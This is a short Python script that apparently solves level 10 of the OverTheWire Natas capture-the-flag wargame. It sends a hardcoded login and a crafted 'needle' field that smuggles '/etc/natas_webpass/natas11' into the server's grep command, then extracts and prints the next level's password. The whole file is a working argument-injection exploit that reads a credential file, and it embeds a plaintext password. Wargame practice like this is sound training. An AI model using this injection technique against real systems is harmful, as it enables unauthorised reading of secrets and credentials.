#!/usr/local/bin/env python
import requests
import re
import base64


username = "natas10"
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://%s.natas.labs.overthewire.org/' % username

response = requests.post(url, auth=(username, password), data={"needle": ". /etc/natas_webpass/natas11 ", "submit": "submit"})
content = response.text

# print(content)
print(re.findall('natas11:(.*)', content)[0])
